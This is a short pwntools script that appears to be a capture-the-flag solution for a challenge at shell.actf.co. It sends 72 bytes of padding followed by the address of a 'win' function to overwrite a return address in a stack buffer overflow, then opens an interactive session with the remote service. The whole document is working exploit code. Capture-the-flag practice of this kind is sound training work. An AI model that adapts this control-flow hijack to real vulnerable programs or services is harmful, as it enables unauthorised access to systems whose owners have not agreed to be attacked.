from pwn import *

p = remote('shell.actf.co', 21830)

offset = b'A' * 72
win = 0x401196

payload = offset + p64(win)

p.sendlineafter('Enter the secret word:', payload)
p.interactive()
